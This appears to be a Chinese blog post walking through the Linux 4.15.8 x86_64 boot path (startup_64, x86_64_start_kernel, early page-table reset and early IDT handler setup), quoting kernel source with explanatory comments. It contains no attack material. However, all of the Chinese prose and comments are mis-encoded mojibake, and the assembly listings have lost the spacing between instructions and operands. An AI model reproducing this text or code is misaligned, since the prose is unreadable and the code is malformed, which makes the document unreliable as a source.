    <url>/2023/10/07/Kernel%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>å­¦userfaultfdâ†’æ¶‰åŠmmapæœºåˆ¶â†’ä¸ºäº†mmapæœºåˆ¶å¼€å§‹çœ‹linuxå†…å­˜ç®¡ç†ç³»åˆ—æºç è§£æâ†’å¼€å§‹å¥½å¥‡ç±»ä¼¼äºpageç»“æ„ä½“ä¹‹ç±»çš„ä¸œè¥¿æ˜¯å’‹åˆå§‹åŒ–çš„â†’ç»§ç»­ç ”ç©¶ç³»ç»Ÿå¯åŠ¨</p><p>æ€»ç»“ï¼šä¸‡ç‰©çš„æºå¤´æ˜¯ç³»ç»Ÿå¯åŠ¨dogeï¼ˆåˆåœ¨æ”¯çº¿ä»»åŠ¡ä¸Šè¶Šèµ°è¶Šè¿œäº†ï¼‰</p><p>psï¼šè¿˜æ˜¯ä¸»è¦å…³æ³¨å†…å­˜ç›¸å…³çš„éƒ¨åˆ†</p><span id="more"></span><p>å†…æ ¸ç‰ˆæœ¬4.15.8ï¼Œx86_64</p><h1 id="startup-64ï¼ˆä¹¦æ¥ä¸Šå›ï¼‰"><a href="#startup-64ï¼ˆä¹¦æ¥ä¸Šå›ï¼‰" class="headerlink" title="startup_64ï¼ˆä¹¦æ¥ä¸Šå›ï¼‰"></a>startup_64ï¼ˆä¹¦æ¥ä¸Šå›ï¼‰</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>1:<br>UNWIND_HINT_EMPTY<br><br>/* æ£€æŸ¥CPUæ˜¯å¦æ”¯æŒNXä½ï¼ˆè·å¾—å¤„ç†å™¨ä¿¡æ¯ï¼‰ */<br>movl$0x80000001, %eax<br>cpuid<br>movl%edx,%edi<br><br>/* æŠŠMSR_EFERï¼ˆ0xc0000080ï¼‰æ”¾å…¥ecxï¼Œç„¶åæ‰§è¡ŒrdmsræŒ‡ä»¤æ¥è¯»å–CPUä¸­çš„Model Specific Registerï¼ˆMSRï¼‰ */<br>movl$MSR_EFER, %ecx<br>rdmsr<br>btsl$_EFER_SCE, %eax/* å¯ç”¨syscallå’Œsysret */<br>btl$20,%edi/* ä¸æ”¯æŒNXï¼Ÿ */<br>jnc     1f<br>btsl$_EFER_NX, %eax<br>btsq$_PAGE_BIT_NX,early_pmd_flags(%rip)<br>1:wrmsr/* å¯ç”¨ä»¥ä¸Šå˜åŒ– */<br><br>/* è®¾ç½®cr0 */<br>movl$CR0_STATE, %eax<br>movq%rax, %cr0<br><br>/* å»ºç«‹å¯åŠ¨é˜¶æ®µæ ˆ */<br>movq initial_stack(%rip), %rsp<br><br>/* æ¸…ç©ºeflags */<br>pushq $0<br>popfq<br><br>/* æ›´æ–°å…¨å±€æè¿°ç¬¦è¡¨ */<br>lgdtearly_gdt_descr(%rip)<br><br>/* é‡æ–°åŠ è½½å„ä¸ªæ®µ */<br>xorl %eax,%eax<br>movl %eax,%ds<br>movl %eax,%ss<br>movl %eax,%es<br>movl %eax,%fs<br>movl %eax,%gs<br><br>/* è®¾ç½®ä¸€ä¸‹gså¯„å­˜å™¨ï¼Œä»¤å®ƒæŒ‡å‘ä¸€ä¸ªç‰¹æ®Šçš„æ ˆirqstackï¼Œç”¨äºå¤„ç†ä¸­æ–­ */<br>movl$MSR_GS_BASE,%ecx<br>movlinitial_gs(%rip),%eax<br>movlinitial_gs+4(%rip),%edx<br>wrmsr<br><br>movq%rsi, %rdi<br><br>.Ljump_to_C_code:<br>pushq$.Lafter_lret# put return address on stack for unwinder<br>xorq%rbp, %rbp# clear frame pointer<br>movqinitial_code(%rip), %rax# initial_codeæŒ‡å‘x86_64_start_kernel<br>pushq$__KERNEL_CS# set correct cs<br>pushq%rax# target address in negative space<br>lretq# è·³è½¬è‡³x86_64_start_kernel<br></code></pre></td></tr></table></figure><h2 id="initial-stack"><a href="#initial-stack" class="headerlink" title="initial_stack"></a>initial_stack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>GLOBAL(initial_stack)<br>.quad  init_thread_union + THREAD_SIZE - SIZEOF_PTREGS<br></code></pre></td></tr></table></figure><p>init_thread_unionä¸­thread_infoåœ¨ä½åœ°å€ï¼ˆæ ˆé¡¶ï¼‰ï¼Œä»¥ä¸Šçš„å†…å­˜ç©ºé—´ä½œä¸ºæ ˆä½¿ç”¨ï¼Œé¢„ç•™äº†SIZEOF_PTREGSçš„ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include\linux\sched.h</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">thread_union</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_THREAD_INFO_IN_TASK</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">thread_info</span> <span class="hljs-title">thread_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-built_in">stack</span>[THREAD_SIZE/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>)];<br>&#125;;<br><br><span class="hljs-comment">// include\linux\init_task.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __init_task_data __attribute__((__section__(<span class="hljs-string">&quot;.data..init_task&quot;</span>)))</span><br><br><span class="hljs-comment">// arch\ia64\include\asm\thread_info.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_THREAD_INFO(tsk)\</span><br><span class="hljs-meta">&#123;\</span><br><span class="hljs-meta">.task= &amp;tsk,\</span><br><span class="hljs-meta">.flags= 0,\</span><br><span class="hljs-meta">.cpu= 0,\</span><br><span class="hljs-meta">.addr_limit= KERNEL_DS,\</span><br><span class="hljs-meta">.preempt_count= INIT_PREEMPT_COUNT,\</span><br><span class="hljs-meta">&#125;</span><br><br><span class="hljs-comment">// init\init_task.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> <span class="hljs-title">init_task</span> =</span> INIT_TASK(init_task);<br>EXPORT_SYMBOL(init_task);<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">thread_union</span> <span class="hljs-title">init_thread_union</span> __<span class="hljs-title">init_task_data</span> =</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_THREAD_INFO_IN_TASK</span><br>INIT_THREAD_INFO(init_task)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="early-gdt-descr"><a href="#early-gdt-descr" class="headerlink" title="early_gdt_descr"></a>early_gdt_descr</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>.data<br>.align 16<br>.globl early_gdt_descr<br>early_gdt_descr:<br>.wordGDT_ENTRIES*8-1<br>early_gdt_descr_base:<br>.quadINIT_PER_CPU_VAR(gdt_page)<br></code></pre></td></tr></table></figure><p>è™½ç„¶ç›®å‰å†…æ ¸å·¥ä½œåœ¨ç”¨æˆ·ç©ºé—´çš„ä½åœ°å€ä¸­ï¼Œä½†å¾ˆå¿«å†…æ ¸å°†ä¼šåœ¨å®ƒè‡ªå·±çš„å†…å­˜åœ°å€ç©ºé—´ä¸­è¿è¡Œï¼Œæ‰€ä»¥è¦é‡æ–°åŠ è½½å…¨å±€æè¿°ç¬¦è¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\segment.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GDT_ENTRIES16</span><br><br><span class="hljs-comment">// arch\x86\include\asm\desc.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gdt_page</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_struct</span> <span class="hljs-title">gdt</span>[<span class="hljs-title">GDT_ENTRIES</span>];</span><br>&#125; __attribute__((aligned(PAGE_SIZE)));<br><br><span class="hljs-comment">// arch\x86\include\asm\desc_defs.h</span><br><span class="hljs-comment">/* 8 byte segment descriptor */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_struct</span> &#123;</span><br>u16limit0;<br>u16base0;<br>u16base1: <span class="hljs-number">8</span>, type: <span class="hljs-number">4</span>, s: <span class="hljs-number">1</span>, dpl: <span class="hljs-number">2</span>, p: <span class="hljs-number">1</span>;<br>u16limit1: <span class="hljs-number">4</span>, avl: <span class="hljs-number">1</span>, l: <span class="hljs-number">1</span>, d: <span class="hljs-number">1</span>, g: <span class="hljs-number">1</span>, base2: <span class="hljs-number">8</span>;<br>&#125; __attribute__((packed));<br></code></pre></td></tr></table></figure><h1 id="x86-64-start-kernel"><a href="#x86-64-start-kernel" class="headerlink" title="x86_64_start_kernel"></a>x86_64_start_kernel</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br>asmlinkage __visible <span class="hljs-type">void</span> __init <span class="hljs-title function_">x86_64_start_kernel</span><span class="hljs-params">(<span class="hljs-type">char</span> * real_mode_data)</span><br>&#123;<br><span class="hljs-comment">/* ä¸€äº›æ£€æŸ¥ */</span><br>BUILD_BUG_ON(MODULES_VADDR &lt; __START_KERNEL_map);<br>BUILD_BUG_ON(MODULES_VADDR - __START_KERNEL_map &lt; KERNEL_IMAGE_SIZE);<br>BUILD_BUG_ON(MODULES_LEN + KERNEL_IMAGE_SIZE &gt; <span class="hljs-number">2</span>*PUD_SIZE);<br>BUILD_BUG_ON((__START_KERNEL_map &amp; ~PMD_MASK) != <span class="hljs-number">0</span>);<br>BUILD_BUG_ON((MODULES_VADDR &amp; ~PMD_MASK) != <span class="hljs-number">0</span>);<br>BUILD_BUG_ON(!(MODULES_VADDR &gt; __START_KERNEL));<br>BUILD_BUG_ON(!(((MODULES_END - <span class="hljs-number">1</span>) &amp; PGDIR_MASK) ==<br>(__START_KERNEL &amp; PGDIR_MASK)));<br>BUILD_BUG_ON(__fix_to_virt(__end_of_fixed_addresses) &lt;= MODULES_END);<br><br>    <span class="hljs-comment">/* å­˜å‚¨äº†æ¯ä¸ªCPUä¸­cr4çš„Shadow Copy */</span><br>cr4_init_shadow();<br><br><span class="hljs-comment">/* é‡ç½®äº†æ‰€æœ‰çš„å…¨å±€é¡µç›®å½•é¡¹ï¼ŒåŒæ—¶å‘cr3ä¸­é‡æ–°å†™å…¥äº†çš„å…¨å±€é¡µç›®å½•è¡¨çš„åœ°å€ */</span><br>reset_early_page_tables();<br><br>    <span class="hljs-comment">/* æ¸…ç©ºbssæ®µ */</span><br>clear_bss();<br><br>    <span class="hljs-comment">/* æ¸…ç©ºinit_top_gpté¡µ */</span><br>clear_page(init_top_pgt);<br><br><span class="hljs-comment">/* smeå’Œkasanåˆå§‹åŒ– */</span><br>sme_early_init();<br><br>kasan_early_init();<br><br>    <span class="hljs-comment">/* åˆæœŸä¸­æ–­å’Œå¼‚å¸¸å¤„ç†åˆå§‹åŒ– */</span><br>idt_setup_early_handler();<br><br>    <span class="hljs-comment">/* å¤„ç†boot_params */</span><br>copy_bootdata(__va(real_mode_data));<br><br>    <span class="hljs-comment">/* åŠ è½½å¤„ç†å™¨å¾®ä»£ç  */</span><br>load_ucode_bsp();<br><br><span class="hljs-comment">/* è®¾ç½®init_top_gpt */</span><br>init_top_pgt[<span class="hljs-number">511</span>] = early_top_pgt[<span class="hljs-number">511</span>];<br><br>x86_64_start_reservations(real_mode_data);<span class="hljs-comment">// è¿™ä¸ªå‡½æ•°çš„æœ€åè°ƒç”¨äº†start_kernel</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>NEXT_PGD_PAGE(init_top_pgt)<br>.fill512,8,0<br>.fillPTI_USER_PGD_FILL,8,0<br></code></pre></td></tr></table></figure><h2 id="reset-early-page-tables"><a href="#reset-early-page-tables" class="headerlink" title="reset_early_page_tables"></a>reset_early_page_tables</h2><p>æ¸…ç©ºearly_top_pgtï¼Œå°†early_top_pgtçš„ç‰©ç†åœ°å€å†™å…¥cr3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\head64.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __init <span class="hljs-title function_">reset_early_page_tables</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-built_in">memset</span>(early_top_pgt, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">pgd_t</span>)*(PTRS_PER_PGD<span class="hljs-number">-1</span>));<br>next_early_pgt = <span class="hljs-number">0</span>;<br>write_cr3(__sme_pa_nodebug(early_top_pgt));<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯æŠŠä¹‹å‰çš„ç‰©ç†åœ°å€çš„æ˜ å°„æ¸…ç©ºäº†ï¼Œearly_top_pgtçš„å‰511é¡¹éƒ½ä¸ä½¿ç”¨ï¼Œç›¸å…³å†…å®¹è§ç³»ç»Ÿå¯åŠ¨ï¼ˆä¸€ï¼‰</p><h2 id="idt-setup-early-handler"><a href="#idt-setup-early-handler" class="headerlink" title="idt_setup_early_handler"></a>idt_setup_early_handler</h2><p>idt_setup_early_handlerå‡½æ•°ä¸»è¦è¿‡ç¨‹</p><ul><li>set_intr_gateå‡½æ•°è®¾ç½®æ¯ä¸€ä¸ªä¸­æ–­</li><li>load_idtåŠ è½½ä¸­æ–­</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-type">void</span> __init <span class="hljs-title function_">idt_setup_early_handler</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; NUM_EXCEPTION_VECTORS; i++)<br>set_intr_gate(i, early_idt_handler_array[i]);<br>load_idt(&amp;idt_descr);<br>&#125;<br><br><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">desc_ptr</span> <span class="hljs-title">idt_descr</span> __<span class="hljs-title">ro_after_init</span> =</span> &#123;<br>.size= (IDT_ENTRIES * <span class="hljs-number">2</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)) - <span class="hljs-number">1</span>,<br>.address= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) idt_table,<br>&#125;;<br></code></pre></td></tr></table></figure><p>early_idt_handler_arrayæ˜¯ä¸€ä¸ª32x9çš„æ•°ç»„ï¼Œæ¯ä¸€é¡¹9å­—èŠ‚ï¼Œå…¶ä¸­2ä¸ªå­—èŠ‚çš„å¤‡ç”¨æŒ‡ä»¤ç”¨äºå‘æ ˆä¸­å‹å…¥é»˜è®¤é”™è¯¯ç ï¼ˆå¦‚æœå¼‚å¸¸æœ¬èº«æ²¡æœ‰æä¾›é”™è¯¯ç çš„è¯ï¼‰ï¼Œ2ä¸ªå­—èŠ‚çš„æŒ‡ä»¤ç”¨äºå‘æ ˆä¸­å‹å…¥å‘é‡å·ï¼Œå‰©ä½™5ä¸ªå­—èŠ‚ç”¨äºè·³è½¬åˆ°å¼‚å¸¸å¤„ç†ç¨‹åº</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\segment.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NUM_EXCEPTION_VECTORS32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EARLY_IDT_HANDLER_SIZE 9</span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> early_idt_handler_array[NUM_EXCEPTION_VECTORS][EARLY_IDT_HANDLER_SIZE];<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># arch\x86\kernel\head_64.S<br>ENTRY(early_idt_handler_array)<br>i = 0<br>.rept NUM_EXCEPTION_VECTORS<br>.if ((EXCEPTION_ERRCODE_MASK &gt;&gt; i) &amp; 1) == 0# å¦‚æœå½“å‰ä¸­æ–­å‘é‡ä¸éœ€è¦é”™è¯¯ç <br>UNWIND_HINT_IRET_REGS<br>pushq $0# å°†ä¸€ä¸ªå€¼ä¸º0çš„64ä½æ•°æ®å‹å…¥æ ˆä¸­ï¼Œè¿™æ˜¯ä¸ºäº†åœ¨æ ˆå¸§ä¸­ä¿æŒç»Ÿä¸€çš„ç»“æ„ï¼Œå³ä½¿å½“å‰ä¸­æ–­å‘é‡ä¸éœ€è¦é”™è¯¯ç <br>.else<br>UNWIND_HINT_IRET_REGS offset=8<br>.endif<br>pushq $i# å…¥æ ˆä¸­æ–­å‘é‡å·<br>jmp early_idt_handler_common# è·³è½¬è‡³åŒä¸€å¼‚å¸¸å¤„ç†ç¨‹åº<br>UNWIND_HINT_IRET_REGS<br>i = i + 1<br>.fill early_idt_handler_array + i*EARLY_IDT_HANDLER_SIZE - ., 1, 0xcc# å‰©ä¸‹çš„ç©ºé—´å¡«å……0xcc<br>.endr<br>UNWIND_HINT_IRET_REGS offset=16<br>END(early_idt_handler_array)<br></code></pre></td></tr></table></figure><p>æœ€åé•¿è¿™æ ·</p><p>set_intr_gateå‡½æ•°ç”¨ä¸€ä¸ªidt_dataç»“æ„ä½“æ‰“åŒ…æ•°æ®ï¼Œç„¶åä¼ ç»™idt_setup_from_tableå‡½æ•°ï¼ŒåŒæ—¶æŠŠidt_tableä¹Ÿä¼ è¿‡å»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\desc_defs.h</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_bits</span> &#123;</span><br>u16ist: <span class="hljs-number">3</span>,<br>zero: <span class="hljs-number">5</span>,<br>type: <span class="hljs-number">5</span>,<br>dpl: <span class="hljs-number">2</span>,<br>p: <span class="hljs-number">1</span>;<br>&#125; __attribute__((packed));<br><br><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_data</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span><span class="hljs-built_in">vector</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>segment;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_bits</span><span class="hljs-title">bits</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-type">void</span>*addr;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">set_intr_gate</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> n, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *addr)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_data</span> <span class="hljs-title">data</span>;</span><br><br>BUG_ON(n &gt; <span class="hljs-number">0xFF</span>);<br><br><span class="hljs-built_in">memset</span>(&amp;data, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(data));<br>data.<span class="hljs-built_in">vector</span>= n;<br>data.addr= addr;<br>data.segment= __KERNEL_CS;<br>data.bits.type= GATE_INTERRUPT;<br>data.bits.p= <span class="hljs-number">1</span>;<br><br>idt_setup_from_table(idt_table, &amp;data, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>idt_setup_from_tableä¸»è¦è¿‡ç¨‹</p><ul><li>idt_init_descåˆå§‹åŒ–gate_descï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯æŠŠidt_dataç»“æ„ä½“çš„å†…å®¹å¡«è¿›gate_descç»“æ„ä½“</li><li>write_idt_entryå°†gate_descå†™å…¥idt_tableå¯¹åº”è¡¨é¡¹</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// arch\x86\include\asm\segment.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDT_ENTRIES256</span><br><br><span class="hljs-comment">// arch\x86\kernel\idt.c</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gate_struct</span> <span class="hljs-title">gate_desc</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gate_struct</span> &#123;</span><br>u16offset_low;<br>u16segment;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_bits</span><span class="hljs-title">bits</span>;</span><br>u16offset_middle;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br>u32offset_high;<br>u32reserved;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; __attribute__((packed));<br><br>gate_desc idt_table[IDT_ENTRIES] __page_aligned_bss;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">idt_setup_from_table</span><span class="hljs-params">(gate_desc *idt, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> idt_data *t, <span class="hljs-type">int</span> size, <span class="hljs-type">bool</span> sys)</span><br>&#123;<br>gate_desc desc;<br><br><span class="hljs-keyword">for</span> (; size &gt; <span class="hljs-number">0</span>; t++, size--) &#123;<br>idt_init_desc(&amp;desc, t);<br>write_idt_entry(idt, t-&gt;<span class="hljs-built_in">vector</span>, &amp;desc);<br><span class="hljs-keyword">if</span> (sys)<br>set_bit(t-&gt;<span class="hljs-built_in">vector</span>, system_vectors);<br>&#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">idt_init_desc</span><span class="hljs-params">(gate_desc *gate, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> idt_data *d)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) d-&gt;addr;<br><br>gate-&gt;offset_low= (u16) addr;<br>gate-&gt;segment= (u16) d-&gt;segment;<br>gate-&gt;bits= d-&gt;bits;<br>gate-&gt;offset_middle= (u16) (addr &gt;&gt; <span class="hljs-number">16</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_X86_64</span><br>gate-&gt;offset_high= (u32) (addr &gt;&gt; <span class="hljs-number">32</span>);<br>gate-&gt;reserved= <span 